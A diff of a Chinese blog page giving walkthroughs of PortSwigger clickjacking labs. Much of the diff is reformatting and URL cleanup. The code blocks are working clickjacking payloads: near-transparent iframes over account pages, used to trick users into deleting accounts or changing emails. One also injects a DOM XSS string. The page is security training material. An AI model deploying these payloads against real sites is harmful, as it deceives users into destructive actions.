@@ -24,7 +24,7 @@
     <meta name="description" content="All labs | Web Security Academy — 所有实验室 |网络安全学院 (portswigger.net)  1. Basic clickjacking with CSRF token protection  具有 CSRF 令牌保护的基本点击劫持  目标： 制作一些 HTML 来构建帐户页面并欺骗用户删除他们的帐户 过程：  先登录账号，登录后界面上有个选项为Delet">
 <meta property="og:type" content="website">
 <meta property="og:title" content="portswigger 靶场之点击劫持（Clickjacking）">
-<meta property="og:url" content="https://zero-yi7.github.io/wiki/portswigger/clickjacking.html">
+<meta property="og:url" content="https://askrabbit.cn/wiki/portswigger/clickjacking">
 <meta property="og:site_name" content="Rabbit&#39;s Blog">
 <meta property="og:description" content="All labs | Web Security Academy — 所有实验室 |网络安全学院 (portswigger.net)  1. Basic clickjacking with CSRF token protection  具有 CSRF 令牌保护的基本点击劫持  目标： 制作一些 HTML 来构建帐户页面并欺骗用户删除他们的帐户 过程：  先登录账号，登录后界面上有个选项为Delet">
 <meta property="og:locale" content="zh_CN">
@@ -69,21 +69,21 @@
 <div class="l_body s:aa content tech" id="start" layout="page" ><aside class="l_left"><div class="leftbar-container">
 
 
-<header class="header"><div class="logo-wrap"><div class="icon"><img no-lazy class="icon" src="/wiki/portswigger/professional.svg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></div><a class="title" href="/wiki/portswigger/index.html"><div class="main" ff="title">portswigger</div></a></div></header>
+<header class="header"><div class="logo-wrap"><div class="icon"><img no-lazy class="icon" src="/wiki/portswigger/professional.svg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></div><a class="title" href="/wiki/portswigger/"><div class="main" ff="title">portswigger</div></a></div></header>
 
 <div class="nav-area">
 <div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" data-filter="/wiki/portswigger/" placeholder="在portswigger靶场中搜索..."></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
 
 
-<nav class="menu dis-select"><a class="nav-item" title="主页" href="/"><span>主页</span></a><a class="nav-item" title="探索" href="/wiki/"><span>探索</span></a></nav>
+<nav class="menu dis-select"><a class="nav-item" title="主页" href="/"><span>主页</span></a><a class="nav-item active" title="探索" href="/wiki/"><span>探索</span></a></nav>
 </div>
 <div class="widgets">
 
-<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">快速开始</span></div><div class="widget-body fs14"><a class="link" href="/wiki/portswigger/index.html#start"><span class="toc-text">portswigger 靶场记录</span></a></div><div class="widget-header dis-select"><span class="name">漏洞类型</span></div><div class="widget-body fs14"><a class="link" href="/wiki/portswigger/sql-injection.html"><span class="toc-text">portswigger 靶场之 SQL 注入</span></a><a class="link" href="/wiki/portswigger/xss-part1.html"><span class="toc-text">portswigger 靶场之 XSS 篇(上)</span></a><a class="link" href="/wiki/portswigger/xss-part2.html"><span class="toc-text">portswigger 靶场之 XSS 篇(下)</span></a><a class="link" href="/wiki/portswigger/ssrf.html"><span class="toc-text">portswigger 靶场之 SSRF 篇</span></a><a class="link" href="/wiki/portswigger/xml-external-entity-attack.html"><span class="toc-text">Portswigger 靶场之 XML 外部实体 (XXE) 注入</span></a><a class="link" href="/wiki/portswigger/csrf.html"><span class="toc-text">portswigger 靶场之 CSRF 篇</span></a><a class="link" href="/wiki/portswigger/http-request-smuggling.html"><span class="toc-text">PortSwigger 靶场之 HTTP 请求走私</span></a><a class="link" href="/wiki/portswigger/directory-traversal.html"><span class="toc-text">portswigger 靶场之目录遍历</span></a><a class="link active" href="/wiki/portswigger/clickjacking.html"><span class="toc-text">portswigger 靶场之点击劫持（Clickjacking）</span><svg class="active-icon" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M21 11.098v4.993c0 3.096 0 4.645-.734 5.321c-.35.323-.792.526-1.263.58c-.987.113-2.14-.907-4.445-2.946c-1.02-.901-1.529-1.352-2.118-1.47a2.225 2.225 0 0 0-.88 0c-.59.118-1.099.569-2.118 1.47c-2.305 2.039-3.458 3.059-4.445 2.945a2.238 2.238 0 0 1-1.263-.579C3 20.736 3 19.188 3 16.091v-4.994C3 6.81 3 4.666 4.318 3.333C5.636 2 7.758 2 12 2c4.243 0 6.364 0 7.682 1.332C21 4.665 21 6.81 21 11.098" opacity=".5"/><path fill="currentColor" d="M9 5.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5z"/></svg></a><a class="link" href="/wiki/portswigger/authentication.html"><span class="toc-text">PortSwigger 之“身份认证”</span></a><a class="link" href="/wiki/portswigger/access-control.html"><span class="toc-text">Portswigger 靶场之“访问控制漏洞”</span></a><a class="link" href="/wiki/portswigger/file-upload.html"><span class="toc-text">Portswigger 靶场之“文件上传”</span></a><a class="link" href="/wiki/portswigger/business-logic-flaws.html"><span class="toc-text">Portswigger 靶场之“业务逻辑漏洞</span></a><a class="link" href="/wiki/portswigger/os-command-injection.html"><span class="toc-text">Portswigger 靶场 | 操作系统命令注入</span></a></div></widget>
+<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">快速开始</span></div><div class="widget-body fs14"><a class="link" href="/wiki/portswigger/#start"><span class="toc-text">portswigger 靶场记录</span></a></div><div class="widget-header dis-select"><span class="name">漏洞类型</span></div><div class="widget-body fs14"><a class="link" href="/wiki/portswigger/sql-injection"><span class="toc-text">portswigger 靶场之 SQL 注入</span></a><a class="link" href="/wiki/portswigger/xss-part1"><span class="toc-text">portswigger 靶场之 XSS 篇(上)</span></a><a class="link" href="/wiki/portswigger/xss-part2"><span class="toc-text">portswigger 靶场之 XSS 篇(下)</span></a><a class="link" href="/wiki/portswigger/ssrf"><span class="toc-text">portswigger 靶场之 SSRF 篇</span></a><a class="link" href="/wiki/portswigger/xml-external-entity-attack"><span class="toc-text">Portswigger 靶场之 XML 外部实体 (XXE) 注入</span></a><a class="link" href="/wiki/portswigger/csrf"><span class="toc-text">portswigger 靶场之 CSRF 篇</span></a><a class="link" href="/wiki/portswigger/http-request-smuggling"><span class="toc-text">PortSwigger 靶场之 HTTP 请求走私</span></a><a class="link" href="/wiki/portswigger/directory-traversal"><span class="toc-text">portswigger 靶场之目录遍历</span></a><a class="link active" href="/wiki/portswigger/clickjacking"><span class="toc-text">portswigger 靶场之点击劫持（Clickjacking）</span><svg class="active-icon" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M21 11.098v4.993c0 3.096 0 4.645-.734 5.321c-.35.323-.792.526-1.263.58c-.987.113-2.14-.907-4.445-2.946c-1.02-.901-1.529-1.352-2.118-1.47a2.225 2.225 0 0 0-.88 0c-.59.118-1.099.569-2.118 1.47c-2.305 2.039-3.458 3.059-4.445 2.945a2.238 2.238 0 0 1-1.263-.579C3 20.736 3 19.188 3 16.091v-4.994C3 6.81 3 4.666 4.318 3.333C5.636 2 7.758 2 12 2c4.243 0 6.364 0 7.682 1.332C21 4.665 21 6.81 21 11.098" opacity=".5"/><path fill="currentColor" d="M9 5.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5z"/></svg></a><a class="link" href="/wiki/portswigger/authentication"><span class="toc-text">PortSwigger 之“身份认证”</span></a><a class="link" href="/wiki/portswigger/access-control"><span class="toc-text">Portswigger 靶场之“访问控制漏洞”</span></a><a class="link" href="/wiki/portswigger/file-upload"><span class="toc-text">Portswigger 靶场之“文件上传”</span></a><a class="link" href="/wiki/portswigger/business-logic-flaws"><span class="toc-text">Portswigger 靶场之“业务逻辑漏洞</span></a><a class="link" href="/wiki/portswigger/os-command-injection"><span class="toc-text">Portswigger 靶场 | 操作系统命令注入</span></a></div></widget>
 
 
 </div>
-<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/Zero-Yi7" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/08a41b181ce68.svg"/></a></div></footer>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/Zero-Yi7" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/08a41b181ce68.svg"/></a><a class="social" onclick="switchTheme()"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024"><path fill="currentColor" fill-rule="evenodd" d="M582.4 326.4c-140.8 0-256 115.2-256 256s115.2 256 256 256 256-115.2 256-256-115.2-256-256-256z m0 448c-70.4 0-131.2-36.8-164.8-92.8 12.8 3.2 27.2 4.8 40 4.8 121.6 0 219.2-99.2 219.2-219.2 0-17.6-1.6-35.2-6.4-52.8 60.8 32 102.4 96 102.4 169.6 1.6 104-84.8 190.4-190.4 190.4zM582.4 262.4c17.6 0 32-14.4 32-32v-128c0-17.6-14.4-32-32-32s-32 14.4-32 32v128c0 17.6 14.4 32 32 32zM262.4 582.4c0-17.6-14.4-32-32-32h-128c-17.6 0-32 14.4-32 32s14.4 32 32 32h128c17.6 0 32-14.4 32-32zM310.4 356.8c6.4 6.4 14.4 9.6 22.4 9.6 8 0 16-3.2 22.4-9.6 12.8-12.8 12.8-32 0-44.8l-91.2-91.2c-12.8-12.8-32-12.8-44.8 0-12.8 12.8-12.8 32 0 44.8l91.2 91.2zM944 220.8c-12.8-12.8-32-12.8-44.8 0l-91.2 91.2c-12.8 12.8-12.8 32 0 44.8 6.4 6.4 14.4 9.6 22.4 9.6 8 0 16-3.2 22.4-9.6l91.2-91.2c12.8-12.8 12.8-33.6 0-44.8zM310.4 808l-91.2 91.2c-12.8 12.8-12.8 32 0 44.8 6.4 6.4 14.4 9.6 22.4 9.6 8 0 16-3.2 22.4-9.6l91.2-91.2c12.8-12.8 12.8-32 0-44.8-11.2-11.2-32-11.2-44.8 0z"></path></svg></a></div></footer>
 </div></aside><div class="l_main" id="main">
 
 
@@ -93,7 +93,7 @@
 <div class="article banner top">
   <div class="content">
     <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
-<span class="sep"></span><a class="cap breadcrumb" id="menu" href="/wiki">文档</a><span class="sep"></span><a class="cap breadcrumb" id="proj" href="/wiki/portswigger/index.html">portswigger</a></div>
+<span class="sep"></span><a class="cap breadcrumb" id="menu" href="/wiki">文档</a><span class="sep"></span><a class="cap breadcrumb" id="proj" href="/wiki/portswigger/">portswigger</a></div>
 <div class="flex-row" id="post-meta"><span class="text created">更新于：<time datetime="2022-09-11T15:56:53.000Z">2022-09-11</time></span></div></div></div>
     
     <div class="bottom only-title">
@@ -125,24 +125,7 @@
 <p>在点击劫持攻击中，攻击者会将一个<strong>透明的iframe</strong>覆盖在目标网站的页面上，然后<strong>诱使受害者</strong>在该iframe中<strong>点击</strong>某些看似无害的按钮或链接，实际上却是在执行攻击者的恶意操作</p>
 <p>攻击者<strong>使用iframe的目的是为了掩盖受害者的真实行为</strong>。因为iframe可以嵌入其他网站或页面，攻击者可以在iframe中展示一个看似无害的页面或按钮，但实际上它们可能会触发跨站点请求，执行攻击者的恶意操作。</p>
 </blockquote>
-<pre><code class="language-html">&lt;style&gt;
-    iframe &#123;
-        position:relative;
-        width:1000px;
-        height: 700px;
-        opacity: 0.0000001;
-        z-index: 2;
-    &#125;
-    div &#123;
-        position:absolute;
-        top:515px;
-        left:60px;
-        z-index: 1;
-    &#125;
-&lt;/style&gt;
-&lt;div&gt;Click Me&lt;/div&gt;
-&lt;iframe src=&quot;https://0a37007803673341c044c7f400150047.web-security-academy.net/my-account&quot;&gt;&lt;/iframe&gt;
-</code></pre>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css">    <span class="hljs-selector-tag">iframe</span> &#123;</span><br><span class="language-css">        <span class="hljs-attribute">position</span>:relative;</span><br><span class="language-css">        <span class="hljs-attribute">width</span>:<span class="hljs-number">1000px</span>;</span><br><span class="language-css">        <span class="hljs-attribute">height</span>: <span class="hljs-number">700px</span>;</span><br><span class="language-css">        <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0.0000001</span>;</span><br><span class="language-css">        <span class="hljs-attribute">z-index</span>: <span class="hljs-number">2</span>;</span><br><span class="language-css">    &#125;</span><br><span class="language-css">    <span class="hljs-selector-tag">div</span> &#123;</span><br><span class="language-css">        <span class="hljs-attribute">position</span>:absolute;</span><br><span class="language-css">        <span class="hljs-attribute">top</span>:<span class="hljs-number">515px</span>;</span><br><span class="language-css">        <span class="hljs-attribute">left</span>:<span class="hljs-number">60px</span>;</span><br><span class="language-css">        <span class="hljs-attribute">z-index</span>: <span class="hljs-number">1</span>;</span><br><span class="language-css">    &#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>Click Me<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://0a37007803673341c044c7f400150047.web-security-academy.net/my-account&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br></code></pre></td></tr></table></figure>
 <h2 id="2-Clickjacking-with-form-input-data-prefilled-from-a-URL-parameter">2. Clickjacking with form input data prefilled from a URL parameter</h2>
 <blockquote>
 <p>使用从 URL 参数预填充的表单输入数据进行点击劫持</p>
@@ -151,24 +134,7 @@
 <p>诱使用户点击“更新电子邮件”按钮</p>
 <p><strong>过程：</strong></p>
 <p>登录账号，转到服务器界面，这一关，主要是<u><strong>通过 GET 参数的方式</strong></u>预填充表单，即在 URL 上添加了修改的邮箱</p>
-<pre><code class="language-html">&lt;style&gt;
-    iframe &#123;
-        position:relative;
-        width:500px;
-        height: 700px;
-        opacity: 0.00;
-        z-index: 2;
-    &#125;
-    div &#123;
-        position:absolute;
-        top:450px;
-        left:80px;
-        z-index: 1;
-    &#125;
-&lt;/style&gt;
-&lt;div&gt;Test me&lt;/div&gt;
-&lt;iframe src=&quot;https://0a3800d603ebc15ac0aa4aa0002c0090.web-security-academy.net/my-account?email=111@123.com&quot;&gt;&lt;/iframe&gt;
-</code></pre>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css">    <span class="hljs-selector-tag">iframe</span> &#123;</span><br><span class="language-css">        <span class="hljs-attribute">position</span>:relative;</span><br><span class="language-css">        <span class="hljs-attribute">width</span>:<span class="hljs-number">500px</span>;</span><br><span class="language-css">        <span class="hljs-attribute">height</span>: <span class="hljs-number">700px</span>;</span><br><span class="language-css">        <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0.00</span>;</span><br><span class="language-css">        <span class="hljs-attribute">z-index</span>: <span class="hljs-number">2</span>;</span><br><span class="language-css">    &#125;</span><br><span class="language-css">    <span class="hljs-selector-tag">div</span> &#123;</span><br><span class="language-css">        <span class="hljs-attribute">position</span>:absolute;</span><br><span class="language-css">        <span class="hljs-attribute">top</span>:<span class="hljs-number">450px</span>;</span><br><span class="language-css">        <span class="hljs-attribute">left</span>:<span class="hljs-number">80px</span>;</span><br><span class="language-css">        <span class="hljs-attribute">z-index</span>: <span class="hljs-number">1</span>;</span><br><span class="language-css">    &#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>Test me<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://0a3800d603ebc15ac0aa4aa0002c0090.web-security-academy.net/my-account?email=111@123.com&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br></code></pre></td></tr></table></figure>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/portswigger%20%E9%9D%B6%E5%9C%BA%E4%B9%8B%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81%EF%BC%88Clickjacking%EF%BC%89/202410062134395.png" alt="230226PM04_76"></p>
 <h2 id="3-Clickjacking-with-a-frame-buster-script">3. Clickjacking with a frame buster script</h2>
 <blockquote>
@@ -195,24 +161,7 @@
 </li>
 </ul>
 </blockquote>
-<pre><code class="language-html">&lt;style&gt;
-iframe &#123;
-position:relative;
-width:500px;
-height: 700px;
-opacity: 0.1;
-z-index: 2;
-&#125;
-div &#123;
-position:absolute;
-top:450px;
-left:80px;
-z-index: 1;
-&#125;
-&lt;/style&gt;
-&lt;div&gt;Click me&lt;/div&gt;
-&lt;iframe sandbox=&quot;allow-forms&quot; src=&quot;https://0a0e00d50460a332c236f332009c00c0.web-security-academy.net/my-account/?email=hacker@attacker-website.com&quot;&gt;&lt;/iframe&gt;
-</code></pre>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css"><span class="hljs-selector-tag">iframe</span> &#123;</span><br><span class="language-css"><span class="hljs-attribute">position</span>:relative;</span><br><span class="language-css"><span class="hljs-attribute">width</span>:<span class="hljs-number">500px</span>;</span><br><span class="language-css"><span class="hljs-attribute">height</span>: <span class="hljs-number">700px</span>;</span><br><span class="language-css"><span class="hljs-attribute">opacity</span>: <span class="hljs-number">0.1</span>;</span><br><span class="language-css"><span class="hljs-attribute">z-index</span>: <span class="hljs-number">2</span>;</span><br><span class="language-css">&#125;</span><br><span class="language-css"><span class="hljs-selector-tag">div</span> &#123;</span><br><span class="language-css"><span class="hljs-attribute">position</span>:absolute;</span><br><span class="language-css"><span class="hljs-attribute">top</span>:<span class="hljs-number">450px</span>;</span><br><span class="language-css"><span class="hljs-attribute">left</span>:<span class="hljs-number">80px</span>;</span><br><span class="language-css"><span class="hljs-attribute">z-index</span>: <span class="hljs-number">1</span>;</span><br><span class="language-css">&#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>Click me<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">sandbox</span>=<span class="hljs-string">&quot;allow-forms&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://0a0e00d50460a332c236f332009c00c0.web-security-academy.net/my-account/?email=hacker@attacker-website.com&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br></code></pre></td></tr></table></figure>
 <h2 id="4-Exploiting-clickjacking-vulnerability-to-trigger-DOM-based-XSS">4. Exploiting clickjacking vulnerability to trigger DOM-based XSS</h2>
 <blockquote>
 <p>利用点击劫持漏洞触发基于 DOM 的 XSS</p>
@@ -224,25 +173,7 @@ z-index: 1;
 <li>先登录账号，然后到服务器界面，这一关在 iframe 的点击劫持中附加了 DOM XSS。</li>
 <li>通过 name 输入框，放入 JavaScript 脚本<code>&lt;img src=1 onerror=print()&gt;</code>，因为这个 img 标签的 src 属性的值是 1，所以这个图片肯定是不存在的，因此会触发 onerror 事件，并且执行 print() 函数。print() 是 JavaScript 的内置函数，能够在弹窗中输出内容。</li>
 </ol>
-<pre><code class="language-html">&lt;style&gt;
-iframe &#123;
-position:relative;
-width:500px;
-height: 700px;
-opacity: 0.1;
-z-index: 2;
-&#125;
-div &#123;
-position:absolute;
-top:620px;
-left:40px;
-z-index: 1;
-&#125;
-&lt;/style&gt;
-&lt;div&gt;Click me&lt;/div&gt;
-&lt;iframe
-src=&quot;https://0a2a00e403c20784c0166d6a00c800b2.web-security-academy.net/feedback/?name=&lt;img src=1 onerror=print()&gt;&amp;email=hacker@attacker-website.com&amp;subject=test&amp;message=test#feedbackResult&quot;&gt;&lt;/iframe&gt;
-</code></pre>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css"><span class="hljs-selector-tag">iframe</span> &#123;</span><br><span class="language-css"><span class="hljs-attribute">position</span>:relative;</span><br><span class="language-css"><span class="hljs-attribute">width</span>:<span class="hljs-number">500px</span>;</span><br><span class="language-css"><span class="hljs-attribute">height</span>: <span class="hljs-number">700px</span>;</span><br><span class="language-css"><span class="hljs-attribute">opacity</span>: <span class="hljs-number">0.1</span>;</span><br><span class="language-css"><span class="hljs-attribute">z-index</span>: <span class="hljs-number">2</span>;</span><br><span class="language-css">&#125;</span><br><span class="language-css"><span class="hljs-selector-tag">div</span> &#123;</span><br><span class="language-css"><span class="hljs-attribute">position</span>:absolute;</span><br><span class="language-css"><span class="hljs-attribute">top</span>:<span class="hljs-number">620px</span>;</span><br><span class="language-css"><span class="hljs-attribute">left</span>:<span class="hljs-number">40px</span>;</span><br><span class="language-css"><span class="hljs-attribute">z-index</span>: <span class="hljs-number">1</span>;</span><br><span class="language-css">&#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>Click me<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span></span><br><span class="hljs-tag"><span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://0a2a00e403c20784c0166d6a00c800b2.web-security-academy.net/feedback/?name=&lt;img src=1 onerror=print()&gt;&amp;email=hacker@attacker-website.com&amp;subject=test&amp;message=test#feedbackResult&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br></code></pre></td></tr></table></figure>
 <h2 id="5-Multistep-clickjacking">5. Multistep clickjacking</h2>
 <blockquote>
 <p>多步点击劫持</p>
@@ -251,33 +182,11 @@ src=&quot;https://0a2a00e403c20784c0166d6a00c800b2.web-security-academy.net/feed
 <p>诱骗用户单击删除帐户按钮和确认对话框</p>
 <p><strong>过程：</strong></p>
 <p>需要执行两个步骤，<code>删除用户 --&gt; 确认删除</code>，所以设置两个点击按钮</p>
-<pre><code class="language-html">&lt;style&gt;
-   iframe &#123;
-       position:relative;
-       width:500px;
-       height: 700px;
-       opacity: 0.1;
-       z-index: 2;
-   &#125;
-   .firstClick, .secondClick &#123;
-       position:absolute;
-       top:510px;
-       left:50px;
-       z-index: 1;
-   &#125;
-   .secondClick &#123;
-       top:285px;
-       left:225px;
-   &#125;
-&lt;/style&gt;
-&lt;div class=&quot;firstClick&quot;&gt;Click me first&lt;/div&gt;
-&lt;div class=&quot;secondClick&quot;&gt;Click Store&lt;/div&gt;
-&lt;iframe src=&quot;https://0a9a0010038a45ffc436c9d000f50019.web-security-academy.net/my-account&quot;&gt;&lt;/iframe&gt;
-</code></pre>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css">   <span class="hljs-selector-tag">iframe</span> &#123;</span><br><span class="language-css">       <span class="hljs-attribute">position</span>:relative;</span><br><span class="language-css">       <span class="hljs-attribute">width</span>:<span class="hljs-number">500px</span>;</span><br><span class="language-css">       <span class="hljs-attribute">height</span>: <span class="hljs-number">700px</span>;</span><br><span class="language-css">       <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0.1</span>;</span><br><span class="language-css">       <span class="hljs-attribute">z-index</span>: <span class="hljs-number">2</span>;</span><br><span class="language-css">   &#125;</span><br><span class="language-css">   <span class="hljs-selector-class">.firstClick</span>, <span class="hljs-selector-class">.secondClick</span> &#123;</span><br><span class="language-css">       <span class="hljs-attribute">position</span>:absolute;</span><br><span class="language-css">       <span class="hljs-attribute">top</span>:<span class="hljs-number">510px</span>;</span><br><span class="language-css">       <span class="hljs-attribute">left</span>:<span class="hljs-number">50px</span>;</span><br><span class="language-css">       <span class="hljs-attribute">z-index</span>: <span class="hljs-number">1</span>;</span><br><span class="language-css">   &#125;</span><br><span class="language-css">   <span class="hljs-selector-class">.secondClick</span> &#123;</span><br><span class="language-css">       <span class="hljs-attribute">top</span>:<span class="hljs-number">285px</span>;</span><br><span class="language-css">       <span class="hljs-attribute">left</span>:<span class="hljs-number">225px</span>;</span><br><span class="language-css">   &#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;firstClick&quot;</span>&gt;</span>Click me first<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;secondClick&quot;</span>&gt;</span>Click Store<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span 